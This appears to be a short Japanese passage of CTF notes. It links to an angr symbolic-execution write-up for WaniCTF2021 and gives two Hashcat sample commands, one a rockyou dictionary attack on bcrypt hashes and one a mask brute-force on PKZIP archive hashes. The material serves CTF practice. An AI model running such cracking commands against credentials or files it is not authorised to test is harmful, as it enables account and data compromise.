参考：[angrによるシンボリック実行でRev問を解いてみたまとめ【WaniCTF2021】 - かえるのひみつきち](ctf-angr-bigginer)

### Hashcatサンプル

``` bash
# 辞書攻撃(bcrypt $2*$, Blowfish (Unix))
hashcat -a 0 -m 3200 ./hash.txt /usr/share/wordlists/rockyou.txt

# マスクありブルートフォース(PKZIP (Uncompressed))
hashcat -m 17210 -a 3 ./hash.txt -1 ?l?u -2 012 -3 0123 -4 0123456789 ?1?1?1?s2021?2?4?3?4?s 
```



